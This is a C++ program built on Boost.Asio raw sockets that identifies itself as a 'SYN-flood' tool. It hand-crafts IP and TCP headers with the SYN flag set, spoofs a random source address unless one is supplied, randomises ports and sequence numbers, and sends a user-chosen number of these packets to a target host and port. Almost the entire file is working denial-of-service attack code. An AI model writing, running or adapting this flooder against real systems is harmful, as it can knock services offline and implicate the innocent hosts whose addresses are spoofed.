
#include <iostream>
#include <string>
#include <map>
#include <stdexcept>
#include <cstdlib>
#include <boost/asio.hpp>
#include <boost/bind.hpp>
#include <boost/lexical_cast.hpp>
#include <boost/property_tree/ptree.hpp>
#include <boost/property_tree/ini_parser.hpp>
#include <boost/optional.hpp>
#include <boost/program_options.hpp>
#include <boost/system/error_code.hpp>
#include <boost/system/system_error.hpp>
#include "raw_tcp.hpp"
#include "ip_header.hpp" 
#include "tcp_header.hpp"
#include "iphdrincl.hpp"

using namespace boost::program_options;
using namespace boost::property_tree;

template<typename protocol = boost::asio::ip::tcp>
std::string hostname_resolver(const std::string &hostname, const std::string &hint = "")
{
    boost::asio::io_service io_service;
    typename protocol::resolver resolver(io_service);
    typename protocol::resolver::query squery(hostname, hint);
    typename protocol::resolver::iterator it = resolver.resolve(squery);
    return it->endpoint().address().to_string();
}

void set_syn_segment(std::ostream &os, std::map<std::string, std::string> &argmap)
{    
    ip_header iphdr;
    iphdr.version(4);
    iphdr.ihl(iphdr.length() / ip_header::IP_LENGTH_UNIT);
    iphdr.tos(0x10);
    iphdr.frag_off(IP_DF);
    iphdr.ttl(ip_header::IP_DEFAULT_TTL);
    iphdr.protocol(IPPROTO_TCP);
    iphdr.saddr(argmap["source"].empty() ? rand() : ip_header::address_to_binary(argmap["source"]));
    iphdr.daddr(ip_header::address_to_binary(argmap["target"]));

    tcp_header tcp_syn_header(iphdr.address_to_string(iphdr.saddr()), argmap["target"]);
    tcp_syn_header.source(rand());
    tcp_syn_header.dest(boost::lexical_cast<int>(argmap["port"]));
    tcp_syn_header.seq(rand());
    tcp_syn_header.doff(20/4);
    tcp_syn_header.syn(true);
    tcp_syn_header.window(tcp_header::DEFAULT_WINVAL);
     
    iphdr.tot_len(iphdr.length() + tcp_syn_header.length());
    iphdr.check();
    os << iphdr << tcp_syn_header; 
}
 
void get_options(int argc, char **argv, 
        std::map<std::string, std::string> &argmap)
{
    options_description opt("Options");
    opt.add_options()
        ("num,n",    value<std::string>(), "set a time to send")
        ("port,p",   value<std::string>(), "set a target port number")
        ("source,s", value<std::string>(), "set specified address as source address of IP header")
        ("target,t", value<std::string>(), "set a target host")
        ("help,h",   "display this help and exit");
    variables_map vmap;
    store(parse_command_line(argc, argv, opt), vmap);
    notify(vmap);
    if( vmap.count("help") || !vmap.count("port") || !vmap.count("target") ) {
        std::cout << "Usage: " << argv[0] 
            << " -p PORT -t DEST_HOST [options...]" << std::endl << opt << std::endl;
        exit(0);
    }
    argmap["port"] = vmap["port"].as<std::string>();
    argmap["target"] = hostname_resolver(vmap["target"].as<std::string>());
    if( vmap.count("source") )
        argmap["source"] = hostname_resolver(vmap["source"].as<std::string>());
    if( vmap.count("num") )
        argmap["num"] = vmap["num"].as<std::string>();
}
 
int main(int argc, char **argv)
{
    int i = 0;
    try {
        std::srand(std::time(NULL));
        std::cout << "[*] SYN-flood" << std::endl;
        std::map<std::string, std::string> argmap = {{"num", "1"}};
        get_options(argc, argv, argmap);
        std::cout << "[*] TCP segment with SYN flag: " 
            << argmap["target"] << ':' << argmap["port"] << " times=" << argmap["num"] << std::endl;
        
        boost::asio::io_service io_service;
        boost::asio::ip::raw_tcp::socket socket(io_service, boost::asio::ip::raw_tcp::v4());
        //boost::system::error_code ec;
        socket.set_option(boost::asio::ip::ip_hdrincl(true));
        boost::asio::ip::raw_tcp::resolver resolver(io_service);
        boost::asio::ip::raw_tcp::resolver::query query(boost::asio::ip::raw_tcp::v4(), argmap["target"], "");
        boost::asio::ip::raw_tcp::endpoint destination = *resolver.resolve(query);

        boost::asio::streambuf request_buffer;
        std::ostream os(&request_buffer);
        for( ; i < boost::lexical_cast<int>(argmap["num"]); ++i ) {
            set_syn_segment(os, argmap);
            socket.send_to(request_buffer.data(), destination);
            std::cout << '.' << std::flush;
            request_buffer.consume(request_buffer.size());
        }
        std::cout << std::endl;
    } catch( std::exception &e ) {
        std::cerr << "[-] Exception: " << e.what() << std::endl;
    }
    std::cout << "[*] Total: " << i << " packet(s) sent" << std::endl;
    return 0;
}

